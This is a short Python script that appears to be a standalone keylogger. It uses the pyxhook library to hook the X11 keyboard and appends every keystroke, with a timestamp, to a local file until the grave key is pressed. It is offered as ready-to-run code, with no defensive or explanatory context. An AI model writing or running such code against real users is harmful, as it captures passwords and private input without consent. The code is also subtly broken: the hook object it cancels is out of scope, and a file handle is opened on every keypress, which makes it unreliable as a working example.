#apt-get install python-xlib
#pip install pyxhook

import pyxhook
import time

log_file='log.log'

def OnKeyPress(event):
    fob=open(log_file,'a')
    fob.write(time.asctime() +' ')
    fob.write(event.Key)
    fob.write('\n')

    if event.Ascii==96: #96 is the ascii value of the grave key (`)
        fob.close()
        new_hook.cancel()

def main():
    #instantiate HookManager class
    new_hook=pyxhook.HookManager()
    #listen to all keystrokes
    new_hook.KeyDown=OnKeyPress
    #hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()


if __name__ == "__main__":
    main()

